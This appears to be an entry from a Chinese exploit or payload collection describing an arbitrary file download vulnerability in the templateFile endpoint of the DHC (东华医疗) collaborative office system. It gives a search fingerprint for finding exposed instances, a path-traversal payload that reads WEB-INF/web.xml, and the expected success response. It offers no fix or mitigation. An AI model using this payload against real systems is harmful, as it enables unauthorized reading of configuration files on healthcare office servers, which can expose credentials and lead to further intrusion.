# 东华医疗协同办公系统templateFile存在任意文件下载漏洞

东华医疗协同办公系统 ｜ 其他 ｜ —
- **指纹**：`product="DHC-OA"`

**Payload**
```
/common/templateFile?template_name=../../WEB-INF/web.xml
```
- **响应特征**：200